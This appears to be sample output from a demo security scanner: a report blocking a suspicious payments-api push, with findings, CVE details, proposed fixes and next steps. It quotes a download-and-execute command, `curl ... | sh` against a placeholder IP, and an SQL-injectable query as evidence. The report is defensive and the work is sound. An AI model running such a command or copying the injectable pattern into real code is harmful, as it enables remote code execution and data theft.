> Example output from the recorded demo run on 7 Nov 2026, written by @appsec: the appsec-PUSH-2001 room document. Unedited, except that the second Discord account's handle is shown as Spider.

# AppSec report: PUSH-2001

| Item | Value |
| --- | --- |
| Push | payments-api, branch main, commit 7f3c9e1 |
| Author | ext.arjun.mehta |
| Time | 2026-11-07 02:40 IST |
| Message | hotfix: payment retries |
| Verdict | **BLOCK**: 5 findings (1 critical, 3 high, 1 medium) |
| Scope | the 22 lines this push adds or changes, in 4 files |

## Findings

| # | Severity | Rule | Where | Finding | Evidence | Fix |
| --- | --- | --- | --- | --- | --- | --- |
| F1 | critical | MAL-001 (like YARA) | scripts/post_deploy.sh:6 | Downloads a script and runs it (download and execute) | `curl -s http://198.51.100.23/update.sh \| sh` | Remove the line: ship scripts with the release, never fetch and run code at deploy time. Block the download host (Tier 1). |
| F2 | high | SEC-001 (like Gitleaks) | app/config.py:6 | Live payment API key (PayGrid) in code | `PAYGRID_API_KEY = "pg_live_*********************H1d"` | Read the key from the environment (os.environ) as main does. The key is exposed: a person rotates it at PayGrid (Tier 2). |
| F3 | high | CODE-001 (like Semgrep) | app/orders.py:19 | SQL query built from a variable (SQL injection) | `cur.execute(f"SELECT id, amount, status FROM orders WHERE customer_ref = '{customer_ref}'")` | Pass values as query parameters, for example cur.execute("... WHERE customer_ref = %s", (customer_ref,)). |
| F4 | high | DEP-001 (like OSV-Scanner) | requirements.txt:3 | PyYAML 5.3 has 2 known vulnerabilities: CVE-2020-1747, CVE-2020-14343 | `PyYAML==5.3` | Upgrade to 5.4 or later (main has 6.0.2). |
| F5 | medium | DEP-001 (like OSV-Scanner) | requirements.txt:2 | requests 2.19.1 has 3 known vulnerabilities: CVE-2018-18074, CVE-2024-35195, CVE-2024-47081 | `requests==2.19.1` | Upgrade to 2.32.4 or later (main has 2.32.4). |

## Vulnerable dependencies

- CVE-2020-1747 (PyYAML==5.3, fixed in 5.3.1): Arbitrary code execution when full_load or FullLoader parses untrusted YAML
- CVE-2020-14343 (PyYAML==5.3, fixed in 5.4): Arbitrary code execution through full_load or FullLoader (incomplete fix of CVE-2020-1747)
- CVE-2018-18074 (requests==2.19.1, fixed in 2.20.0): Sends the Authorization header to an http URL after an https-to-http redirect on the same host
- CVE-2024-35195 (requests==2.19.1, fixed in 2.32.0): A Session that once used verify=False keeps skipping certificate checks for that host
- CVE-2024-47081 (requests==2.19.1, fixed in 2.32.4): Can leak .netrc credentials to third parties for crafted URLs

## Indicators

- 198.51.100.23: downloads a script and runs it (download and execute) (F1, scripts/post_deploy.sh:6)

Scanned by tools/scan.py, offline and read-only, with 14 rules and 5 advisories. Secrets are redacted.

## Fix (proposed, not merged)

| File | Change | Fixes |
| --- | --- | --- |
| fixes/PUSH-2001/scripts/post_deploy.sh | Removed the line that downloads and runs a script from 198.51.100.23 (and its comment); migrate and restart kept | F1 |
| fixes/PUSH-2001/app/config.py | PAYGRID_API_KEY read from the environment (os.environ) as on main; hard-coded key removed; RETRY_LIMIT = 5 kept | F2 |
| fixes/PUSH-2001/app/orders.py | find_orders passes customer_ref as a query parameter (%s); the payment retry loop with backoff kept | F3 |
| fixes/PUSH-2001/requirements.txt | PyYAML 5.3 back to 6.0.2 and requests 2.19.1 back to 2.32.4, the versions on main | F4, F5 |

Re-scan of fixes/PUSH-2001: PASS, 0 findings (every line of 4 files, 41 lines)

## Next steps

| Step | Tier | Owner |
| --- | --- | --- |
| Do not deploy commit 7f3c9e1 until a fix is merged | - | Neha Kapoor (payments-api lead) |
| Block 198.51.100.23, the download host in F1 (SOC-4001) | Tier 1 | responder prepares, Manoj (on call) approves with Allow once |
| Rotate the PayGrid API key at PayGrid; until then it stays exposed in the repository history | Tier 2 | Neha Kapoor (payments-api lead) |
| Review and merge the fix in fixes/PUSH-2001 | Tier 2 | Neha Kapoor (payments-api lead) |
| Decide whether ext.arjun.mehta's account is compromised (the push looks malicious) | on-call decides | Manoj (on call) |
